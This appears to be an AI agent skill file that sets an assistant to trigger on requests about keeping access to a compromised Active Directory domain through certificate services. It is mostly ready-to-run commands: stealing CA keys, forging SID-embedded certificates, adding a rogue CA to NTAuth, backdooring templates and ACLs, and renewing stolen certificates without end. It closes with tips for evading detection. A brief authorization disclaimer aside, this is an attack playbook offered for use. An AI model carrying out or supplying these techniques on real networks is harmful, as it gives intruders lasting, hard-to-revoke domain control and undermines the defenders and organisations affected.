---
name: ad-cs-persistence
description: Active Directory Certificate Services (AD CS) domain persistence techniques for authorized security testing. Use this skill whenever the user needs to maintain long-term access to a compromised Active Directory environment through certificate-based methods. This includes golden certificates, rogue CA trust, malicious misconfigurations, and certificate renewal abuse. Trigger this skill for any AD CS persistence scenario, certificate forgery, NTAuth manipulation, or when the user mentions maintaining access after initial compromise, especially in environments with certificate-based authentication.
---

# AD CS Domain Persistence

This skill covers domain persistence techniques using Active Directory Certificate Services (AD CS). These methods enable long-term access to compromised environments through certificate-based authentication.

> **⚠️ AUTHORIZED USE ONLY**: These techniques are for authorized security testing, red teaming, and defensive research. Always have written authorization before testing.

## Overview

AD CS persistence provides several advantages:
- **Long validity**: Certificates can remain valid for 5-10+ years
- **Hard to detect**: Forged certificates aren't tracked in CA databases
- **Cannot be revoked**: Unknown certificates can't be revoked by the CA
- **Works with machines**: Combined with S4U2Self, enables persistence on any domain machine

## Technique 1: Golden Certificate (DPERSIST1)

Forge certificates using a stolen CA certificate and private key.

### Identifying CA Certificates

A certificate is a CA certificate if:
- Stored on CA server with private key secured by DPAPI/TPM/HSM
- Issuer and Subject fields match the CA's distinguished name
- Contains "CA Version" extension (exclusive to CA certificates)
- Lacks Extended Key Usage (EKU) fields

### Extracting CA Certificate and Private Key

**Method 1: Using certsrv.msc (GUI)**
- Open `certsrv.msc` on the CA server
- Navigate to the certificate and export with private key

**Method 2: Using Certipy**
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```

**Method 3: DPAPI Theft**
- Apply THEFT2 technique to extract from system storage

### Forging Certificates

**Using ForgeCert:**
```bash
ForgeCert.exe --CaCertPath ca.pfx \
  --CaCertPassword Password123! \
  --Subject "CN=User" \
  --SubjectAltName localadmin@theshire.local \
  --NewCertPath localadmin.pfx \
  --NewCertPassword Password123!
```

**Using Certipy:**
```bash
certipy forge -ca-pfx CORP-DC-CA.pfx \
  -upn administrator@corp.local \
  -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'
```

### Authentication with Forged Certificate

**Using Rubeus:**
```bash
Rubeus.exe asktgt /user:localdomain \
  /certificate:C:\ForgeCert\localadmin.pfx \
  /password:Password123!
```

**Using Certipy:**
```bash
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```

### Important Considerations

- **Target must be active**: The user targeted for forgery must be capable of authenticating in AD
- **krbtgt is ineffective**: Forging certificates for special accounts like krbtgt won't work
- **Validity**: Forged certificates are valid until their end date AND as long as the root CA is valid
- **No revocation**: CA is unaware of forged certificates, so they cannot be revoked

### Strong Certificate Mapping Enforcement (2025+)

Since February 11, 2025 (KB5014754), domain controllers default to **Full Enforcement** for certificate mappings. Forged certificates must:

1. Contain a strong binding to the target account (SID security extension), OR
2. Be paired with a strong explicit mapping on the target object's `altSecurityIdentities` attribute

**Explicit Strong Mapping:**
```powershell
# Map forged cert to target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```

**SID-Aware Forging (Recommended):**
```bash
# Certify 2.0 with SID embedding
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
  --upn administrator@corp.local \
  --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
  --outfile administrator_sid.pfx

# Certipy with SID support
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
  -sid S-1-5-21-1111111111-2222222222-3333333333-500 \
  -out administrator_sid.pfx
```

**Benefits of SID embedding:**
- Avoids touching `altSecurityIdentities` (which may be monitored)
- Satisfies strong mapping checks automatically
- Works under Full Enforcement without additional configuration

## Technique 2: Rogue CA Trust (DPERSIST2)

Add a self-signed CA certificate to the `NTAuthCertificates` object in Active Directory.

### Understanding NTAuthCertificates

- The `NTAuthCertificates` object contains CA certificates in its `cacertificate` attribute
- Domain controllers check this object during certificate authentication
- Authentication succeeds if the certificate's Issuer matches an entry in NTAuthCertificates

### Required Permissions

Normally only these groups can modify NTAuthCertificates:
- Enterprise Admins
- Domain Admins (in forest root domain)
- Administrators (in forest root domain)

### Adding Rogue CA Certificate

**Using certutil:**
```bash
# Add certificate to Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt

# View current NTAuth store
certutil -enterprise -viewstore NTAuth

# Remove certificate by thumbprint
certutil -enterprise -delstore NTAuth <Thumbprint>

# Publish to AD CA containers (improves chain building across forest)
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```

**Using PKI Health Tool:**
- Microsoft's GUI tool for importing third-party CAs to Enterprise NTAuth store

### Combining with Certificate Forging

1. Create a self-signed CA certificate
2. Add it to NTAuthCertificates
3. Use ForgeCert to generate certificates signed by your rogue CA
4. Authenticate with the forged certificates

### Post-2025 Considerations

Placing a rogue CA in NTAuth only establishes trust in the issuing CA. For leaf certificates to work under **Full Enforcement**:
- The leaf must contain the SID security extension, OR
- There must be a strong explicit mapping on the target object (Issuer+Serial in `altSecurityIdentities`)

## Technique 3: Malicious Misconfiguration (DPERSIST3)

Modify security descriptors of AD CS components to enable persistence.

### Target Components

Attackers with elevated access can modify:
- CA server's AD computer object
- CA server's RPC/DCOM server
- Descendant objects in `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`:
  - Certificate Templates container
  - Certification Authorities container
  - NTAuthCertificates object
- AD groups with delegated AD CS rights (e.g., Cert Publishers)

### Example: User Template Manipulation

1. Add `WriteOwner` permission to the default `User` certificate template
2. Change ownership of the template to yourself
3. Set `mspki-certificate-name-flag` to `1` (enables `ENROLLEE_SUPPLIES_SUBJECT`)
4. Enroll using the template with a domain administrator name as SAN
5. Use the acquired certificate for DA authentication

### Persistence Configuration Options

**CA Policy Flags:**
- Enable `EDITF_ATTRIBUTESUBJECTALTNAME2` to allow SAN from requesters
- Keeps ESC1-like paths exploitable

**Template Settings:**
- Add Client Authentication EKU
- Enable `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`
- Modify DACL to allow unauthorized enrollment

**NTAuth Control:**
- Control `NTAuthCertificates` object to re-introduce rogue issuers after cleanup attempts
- Control CA containers for continuous persistence

### Full Enforcement Compatibility

In hardened environments (post-KB5014754), pair misconfigurations with explicit strong mappings:
```powershell
# Add strong mapping to ensure certificates remain usable
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```

## Technique 4: Certificate Renewal Abuse (ESC14)

Renew compromised certificates indefinitely to maintain access.

### How It Works

If you have an authentication-capable certificate (or Enrollment Agent certificate):
- You can renew it indefinitely
- Valid as long as the issuing template remains published
- Valid as long as CA trusts the issuer chain
- Keeps original identity bindings but extends validity
- Difficult to evict unless template is fixed or CA is republished

### Renewal Commands

**Renew stolen user certificate:**
```bash
certipy req -ca CORP-DC-CA \
  -template User \
  -pfx stolen_user.pfx \
  -renew \
  -out user_renewed_2026.pfx
```

**Renew on-behalf-of certificate (Enrollment Agent):**
```bash
certipy req -ca CORP-DC-CA \
  -on-behalf-of 'CORP/victim' \
  -pfx agent.pfx \
  -renew \
  -out victim_renewed.pfx
```

**Full Enforcement compatible renewal:**
```bash
# Add SID for strong mapping under Full Enforcement
certipy req -ca CORP-DC-CA \
  -template User \
  -pfx stolen_user.pfx \
  -renew \
  -sid S-1-5-21-1111111111-2222222222-3333333333-500 \
  -out user_renewed_sid.pfx
```

### Extending Renewal Validity

Attackers with CA admin rights can modify renewal periods:
- Tweak `policy\RenewalValidityPeriodUnits` to lengthen renewed certificate lifetimes
- Issue certificates to themselves with extended validity

## Tool Summary

| Tool | Purpose | Key Features |
|------|---------|-------------|
| **Certipy** | CA operations, forging, renewal | Python-based, SID support, renewal abuse |
| **Certify** | Certificate operations | ForgeCert integration, SID embedding (v2.0+) |
| **ForgeCert** | Certificate forgery | Standalone forging tool |
| **Rubeus** | Kerberos operations | Certificate-based authentication |
| **certutil** | Windows certificate management | NTAuth store manipulation |

## Detection Evasion Tips

1. **Use SID embedding**: Avoids `altSecurityIdentities` modifications that may be monitored
2. **Time operations**: Perform certificate operations during normal business hours
3. **Use legitimate templates**: Prefer existing templates over creating new ones
4. **Avoid obvious targets**: Don't immediately target krbtgt or high-value accounts
5. **Renew strategically**: Renew certificates before they expire to maintain access

## References

- [Microsoft KB5014754 – Certificate-based authentication changes](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [Certipy – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [SpecterOps – Certify 2.0](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [SpecterOps – Certified Pre-Owned PDF](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
